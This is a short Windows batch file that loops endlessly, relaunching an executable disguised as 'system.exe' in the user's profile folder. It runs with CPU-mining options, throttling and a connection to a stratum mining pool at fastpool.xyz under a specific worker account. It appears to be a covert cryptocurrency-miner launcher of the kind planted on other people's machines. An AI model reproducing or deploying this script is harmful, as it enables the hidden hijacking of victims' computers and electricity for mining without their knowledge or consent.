@echo off

:start

  %USERPROFILE%\system.exe -v 0 -r 20 -cpu -cputhreads 3 -cputhrottling 20 -s stratum+tcp://fastpool.xyz:10096 -su 1191499-59.0.user

goto start
